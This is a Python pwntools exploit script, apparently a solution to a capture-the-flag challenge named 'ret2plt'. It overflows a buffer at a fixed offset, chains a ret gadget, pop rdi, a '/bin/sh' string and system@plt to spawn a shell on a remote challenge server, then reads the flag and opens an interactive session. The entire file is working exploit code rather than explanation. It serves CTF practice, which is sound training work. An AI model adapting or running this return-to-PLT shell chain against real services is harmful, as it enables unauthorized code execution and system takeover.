#!/usr/bin/env python3
from pwn import *
import time

# aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
# offset to RIP

context.binary = elf = ELF('./ret2plt', checksec=False)

OFFSET_TO_RIP = 72

#p = process(elf.path)
p = remote("offsec.m0lecon.it", 13556)
# pop rdi; ret = 0x000000000040121f
# binsh addr = 0x402017
# system addr = 0x4010a4
# ret gadget = 0x000000000040101a
pop_rdi = elf.sym.pop_rdi_ret
binsh = next(elf.search(b'/bin/sh\x00'))
ret = ROP(elf).find_gadget(['ret']).address

payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(ret),
    p64(pop_rdi),
    p64(binsh),
    p64(elf.plt.system),
)

p.recvuntil(b'order?\n')
p.send(payload)

time.sleep(0.5)
p.sendline(b'cat flag')
p.interactive()
